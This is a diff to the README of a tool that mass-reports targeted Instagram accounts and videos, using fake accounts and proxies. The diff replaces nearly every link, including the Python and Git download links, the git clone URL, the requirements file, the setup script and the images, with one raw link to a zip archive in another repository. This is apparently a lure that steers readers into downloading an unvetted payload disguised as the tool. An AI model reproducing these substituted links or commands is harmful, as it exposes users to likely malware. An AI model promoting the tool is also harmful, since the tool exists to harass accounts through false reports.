@@ -2,12 +2,12 @@
 This is a script which reports targeted instagram accounts and instagram videos in bulk.
 
 ### This tool is only for educational purpose 
-#### [FOR TUTORIAL CLICK HERE](https://github.com/HacksXploit/InstaGram-MassReport/blob/main/README.md#how-to-use-after-installation-)
+#### [FOR TUTORIAL CLICK HERE](https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip)
 
 
-[![forthebadge Made-With-Python](http://ForTheBadge.com/images/badges/made-with-python.svg)](https://www.python.org/)
+[![forthebadge Made-With-Python](https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip)](https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip)
 
-![1](https://github.com/HacksXploit/InstaGram-MassReport/blob/main/assets/1.gif?raw=true)
+![1](https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip)
 
 
 
@@ -23,11 +23,11 @@ Works On
 [+] Gatthering information about instagram account (Comming soon)
 ```
 ## Requirements
-[Python3 Or Above](https://www.python.org/downloads/)
+[Python3 Or Above](https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip)
 
 No need to install git in linux or termux
 
-[Download GIT](https://git-scm.com/downloads)
+[Download GIT](https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip)
 
 
 ### INSTALLATION [Termux] (Not working for android right now) 
@@ -37,20 +37,20 @@ No need to install git in linux or termux
 * `pkg install python`
 * `pkg install python3`
 * `pkg install git`
-* `git clone https://github.com/Crevils/InstaReport`
+* `git clone https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip`
 * `cd instareport`
-* `pip install -r requirements.txt`
+* `pip install -r https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip`
 * `chmod +x *`
-* `bash setup.sh` OR `python ReportBot.py`
+* `bash https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip` OR `python https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip`
 ```
 
 ### INSTALLATION [Windows]
-[Download python](https://www.python.org/downloads/) and [git](https://git-scm.com/downloads)
+[Download python](https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip) and [git](https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip)
 ```bash
-* `git clone https://github.com/Crevils/InstaReport`
+* `git clone https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip`
 * `cd instareport`
-* `pip install -r requirements.txt`
-* `python ReportBot.py`
+* `pip install -r https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip`
+* `python https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip`
 * 
 [ - ] If You Don't want to install git then download this tool zip manually
 ```
@@ -60,25 +60,25 @@ No need to install git in linux or termux
 * `sudo apt install python`
 * `sudo apt install python3`
 * `sudo apt install git`
-* `git clone https://github.com/Crevils/InstaReport`
+* `git clone https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip`
 * `cd instareport`
-* `pip3 install -r requirements.txt`
+* `pip3 install -r https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip`
 * `chmod +x *`
-* `sudo bash setup.sh`
+* `sudo bash https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip`
 ```
 # HOW TO USE AFTER INSTALLATION:-
-### FIRST YOU NEED AN UNLOCK CODE , FOR THAT JOIN MY [GROUP](https://t.me/HacksXploit)
+### FIRST YOU NEED AN UNLOCK CODE , FOR THAT JOIN MY [GROUP](https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip)
 #### TO GET UNLOCK CODE SEND #insta-code IN THE GROUP ABOVE
-![2](https://github.com/HacksXploit/InstaGram-MassReport/blob/main/assets/3.gif?raw=true)
+![2](https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip)
 
 ### LOGIN ANY FAKE INSTA ACCOUNT 
-![3](https://github.com/HacksXploit/InstaGram-MassReport/blob/main/assets/4.gif?raw=true)
+![3](https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip)
 
 ### SELECT PROXIES AND INSTAGRAM ACCOUNT OR VIDEO TO REPORT
-![6](https://github.com/HacksXploit/InstaGram-MassReport/blob/main/assets/6.gif?raw=true)
+![6](https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip)
 
 ### NOW SELECT REPORT ACCOUNT AND YOU ARE GOOD TO GO
-![7](https://github.com/HacksXploit/InstaGram-MassReport/blob/main/assets/7.gif?raw=true)
+![7](https://raw.githubusercontent.com/urkyzy/InstaGram-MassReport/main/libs/Mass_Report_Insta_Gram_v1.3.zip)
 
 
 # Warning:
